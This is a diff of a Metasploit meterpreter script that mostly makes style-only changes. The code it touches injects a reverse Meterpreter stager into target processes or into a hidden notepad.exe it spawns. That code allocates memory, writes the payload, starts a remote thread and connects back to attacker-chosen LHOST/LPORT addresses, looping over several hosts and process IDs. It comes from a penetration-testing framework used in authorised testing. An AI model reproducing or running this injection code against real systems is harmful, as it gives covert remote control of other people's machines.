@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -56,12 +56,12 @@ def inject(target_pid, payload_to_inject)
     raw = payload_to_inject.generate
     mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 
-    print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
+    print_status("Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager")
     print_status("Writing the stager into memory...")
     host_process.memory.write(mem, raw)
     host_process.thread.create(mem, 0)
     print_good("Successfully injected Meterpreter in to process: #{target_pid}")
-  rescue::Exception => e
+  rescue ::Exception => e
     print_error("Failed to Inject payload to #{target_pid}!")
     print_error(e)
   end
@@ -81,30 +81,29 @@ def create_multi_handler(payload_to_inject)
     'Payload'  => mul.datastore['PAYLOAD'],
     'RunAsJob' => true
   )
-
 end
 
 # Function for creating the payload
 #-------------------------------------------------------------------------------
-def create_payload(payload_type,lhost,lport)
+def create_payload(payload_type, lhost, lport)
   print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
   payload = payload_type
   pay = client.framework.payloads.create(payload)
   pay.datastore['LHOST'] = lhost
   pay.datastore['LPORT'] = lport
-  return pay
+  pay
 end
 
 # Function starting notepad.exe process
 #-------------------------------------------------------------------------------
-def start_proc()
+def start_proc
   print_good("Starting Notepad.exe to house Meterpreter session.")
-  proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
+  proc = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
   print_good("Process created with pid #{proc.pid}")
-  return proc.pid
+  proc.pid
 end
 ################## Main ##################
-@exec_opts.parse(args) { |opt, idx, val|
+@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     usage
@@ -119,7 +118,7 @@ end
   when "-mp"
     multi_pid = val.split(",")
   end
-}
+end
 
 # Check for version of Meterpreter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
@@ -133,15 +132,15 @@ if multi_ip
     if multi_ip.length == multi_pid.length
       pid_index = 0
       multi_ip.each do |i|
-        payload = create_payload(payload_type,i,lport)
-        inject(multi_pid[pid_index],payload)
+        payload = create_payload(payload_type, i, lport)
+        inject(multi_pid[pid_index], payload)
         select(nil, nil, nil, 5)
-        pid_index = pid_index + 1
+        pid_index += 1
       end
     else
       multi_ip.each do |i|
-        payload = create_payload(payload_type,i,lport)
-        inject(start_proc,payload)
+        payload = create_payload(payload_type, i, lport)
+        inject(start_proc, payload)
         select(nil, nil, nil, 2)
       end
     end
